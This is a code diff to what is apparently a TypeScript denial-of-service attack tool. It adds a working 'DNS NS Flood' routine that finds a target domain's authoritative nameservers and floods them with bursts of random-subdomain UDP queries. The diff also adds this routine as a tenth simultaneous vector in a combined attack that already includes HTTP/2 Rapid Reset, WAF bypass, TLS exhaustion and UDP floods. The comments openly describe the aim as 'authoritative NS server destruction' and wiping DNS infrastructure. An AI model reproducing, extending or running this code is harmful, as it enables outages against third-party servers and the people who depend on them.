@@ -716,6 +716,102 @@ async function runDNSWaterTorture(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  DNS NS FLOOD — Authoritative-only NS water torture
+//
+//  Focused exclusively on the target domain's own NS servers (no public
+//  resolver fallback). Each NS server receives 3 socket pools, each
+//  sending random-label queries in 4 types: A, MX, TXT, SOA.
+//  Exhausts NS authoritative resolver state, DNS query queue, and
+//  DNSSEC validation workers.
+// ─────────────────────────────────────────────────────────────────────────
+async function runDNSNsFlood(
+  resolvedHost: string,
+  hostname:     string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const NUM_SOCKS_PER_NS = IS_PROD ? Math.min(Math.ceil(threads / 4), 32) : 3;
+  const BURST            = getDynamicBurst(IS_PROD ? 500 : 80);
+  const TICK_MS          = 1;
+
+  const domainParts = hostname.replace(/^https?:\/\//, "").split(".");
+  const rootDomain  = domainParts.length >= 2 ? domainParts.slice(-2).join(".") : hostname;
+
+  // Resolve ALL IPs for ALL authoritative NS servers
+  let nsIPs: string[] = [];
+  try {
+    const nsNames = await dns.resolve(rootDomain, "NS").catch(() => [] as string[]);
+    const groups  = await Promise.all(
+      nsNames.slice(0, 16).map(ns => dns.resolve4(ns).catch(() => [] as string[]))
+    );
+    nsIPs = groups.flat().filter(Boolean);
+  } catch { /**/ }
+
+  // If NS discovery fails → fallback to direct target (still useful DNS flood)
+  if (nsIPs.length === 0) {
+    nsIPs = [resolvedHost];
+  }
+  nsIPs = [...new Set(nsIPs)];
+
+  // Pre-build label pool (max 43 chars)
+  const POOL_SIZE = 1024;
+  const labelPool = Array.from({ length: POOL_SIZE }, () =>
+    Math.random().toString(36).slice(2).padEnd(10, "x") +
+    Math.random().toString(36).slice(2).padEnd(10, "y") +
+    Math.random().toString(36).slice(2).slice(0, 10)
+  );
+
+  // Alternate query types to exhaust different NS processing paths
+  const QTYPES_NS = [1, 15, 16, 6]; // A, MX, TXT, SOA
+  // Also use CHAOS class 20% of the time
+  const QCLASSES  = [1, 1, 1, 1, 3]; // 80% IN, 20% CHAOS
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const allDone: Promise<void>[] = [];
+
+  for (const nsIp of nsIPs) {
+    for (let _pool = 0; _pool < NUM_SOCKS_PER_NS; _pool++) {
+      const done = new Promise<void>(resolve => {
+        const sock = dgram.createSocket("udp4");
+        sock.on("error", () => {});
+        let closed = false;
+        let txid   = randInt(0, 65535);
+        let poolIdx = randInt(0, POOL_SIZE);
+
+        const forceClose = () => {
+          if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+        };
+        signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+
+        sock.bind(0, () => {
+          const iv = setInterval(() => {
+            if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+            for (let i = 0; i < BURST; i++) {
+              const label  = labelPool[poolIdx++ % POOL_SIZE];
+              const fqdn   = `${label}.${rootDomain}`;
+              const qtype  = QTYPES_NS[randInt(0, QTYPES_NS.length)];
+              const qclass = QCLASSES[randInt(0, QCLASSES.length)];
+              const pkt    = buildDNSQuery(fqdn, qtype, txid++, qclass);
+              sock.send(pkt, 0, pkt.length, 53, nsIp, () => {
+                localPkts++; localBytes += pkt.length;
+              });
+            }
+          }, TICK_MS);
+        });
+      });
+      allDone.push(done);
+    }
+  }
+
+  await Promise.all(allDone);
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  NTP FLOOD — real NTP mode 7 monlist + mode 3 client request flood
 //
 //  Sends real NTP binary protocol packets directly to target port 123.
@@ -7438,22 +7534,23 @@ async function runGeassUltima(
   const s = (p: number, b: number, c = 0) => onStats(p, b, c);
 
   // Thread budget — each vector gets a proportional allocation
-  const v1 = Math.max(1, Math.round(threads * 0.22)); // Rapid Reset Ultra
-  const v2 = Math.max(1, Math.round(threads * 0.18)); // WAF Bypass
-  const v3 = Math.max(1, Math.round(threads * 0.16)); // H2 Storm
-  const v4 = Math.max(1, Math.round(threads * 0.12)); // App Smart Flood
-  const v5 = Math.max(1, Math.round(threads * 0.10)); // TLS Session Exhaust
-  const v6 = Math.max(1, Math.round(threads * 0.10)); // Conn Flood
-  const v7 = Math.max(1, Math.round(threads * 0.06)); // HTTP Pipeline
-  const v8 = Math.max(1, Math.round(threads * 0.04)); // SSE Exhaust
-  const v9 = Math.max(1, threads - v1 - v2 - v3 - v4 - v5 - v6 - v7 - v8); // UDP
+  const v1  = Math.max(1, Math.round(threads * 0.22)); // Rapid Reset Ultra
+  const v2  = Math.max(1, Math.round(threads * 0.18)); // WAF Bypass
+  const v3  = Math.max(1, Math.round(threads * 0.16)); // H2 Storm (6 sub-vectors)
+  const v4  = Math.max(1, Math.round(threads * 0.12)); // App Smart Flood
+  const v5  = Math.max(1, Math.round(threads * 0.10)); // TLS Session Exhaust
+  const v6  = Math.max(1, Math.round(threads * 0.10)); // Conn Flood
+  const v7  = Math.max(1, Math.round(threads * 0.06)); // HTTP Pipeline
+  const v8  = Math.max(1, Math.round(threads * 0.03)); // SSE Exhaust
+  const v9  = Math.max(1, Math.round(threads * 0.02)); // UDP Flood
+  const v10 = Math.max(1, threads - v1 - v2 - v3 - v4 - v5 - v6 - v7 - v8 - v9); // DNS NS Flood
 
   const isHttps = targetPort === 443 || /^https:/i.test(base);
 
-  // All 9 vectors fire simultaneously — no warmup delay.
-  // Each vector targets a different resource pool on the server:
-  // V1-V3 = H2/TLS framing layer  |  V4-V6 = connection/thread layer
-  // V7-V8 = HTTP application layer |  V9 = network/bandwidth layer
+  // All 10 vectors fire simultaneously — no warmup delay.
+  // V1-V3  = H2/TLS framing layer  |  V4-V6 = connection/thread layer
+  // V7-V8  = HTTP application layer |  V9 = network bandwidth
+  // V10    = DNS infrastructure (authoritative NS server destruction)
   await Promise.all([
     runRapidResetUltra(resolvedHost, hostname, targetPort, v1, signal, s, proxies),
     runWAFBypass(base, v2, proxies, signal, s),
@@ -7471,6 +7568,7 @@ async function runGeassUltima(
     runHTTPPipeline(resolvedHost, hostname, targetPort, v7, proxies, signal, s),
     runSSEExhaust(resolvedHost, hostname, targetPort, v8, signal, s, proxies),
     runUDPFlood(resolvedHost, targetPort, v9, signal, (p, b) => onStats(p, b)),
+    runDNSNsFlood(resolvedHost, hostname, v10, signal, (p, b) => onStats(p, b)), // [V10] DNS NS destruction
   ]);
 }
 
@@ -7593,6 +7691,11 @@ async function runWorker() {
     // DNS Water Torture — floods target NS servers with random subdomain queries
     // Bypasses CDN/WAF, forces recursive resolution, fills NXDOMAIN cache
     await runDNSWaterTorture(resolvedHost, sniName, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "dns-ns-flood") {
+    // DNS NS Flood — targets ONLY authoritative NS servers, 3 socket pools per NS IP,
+    // A+MX+TXT+SOA queries, 500-burst, CHAOS class 20% — wipes DNS infrastructure
+    await runDNSNsFlood(resolvedHost, sniName, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "ntp-amp") {
     // NTP Flood — real NTP mode 7 monlist + mode 3 client requests to port 123
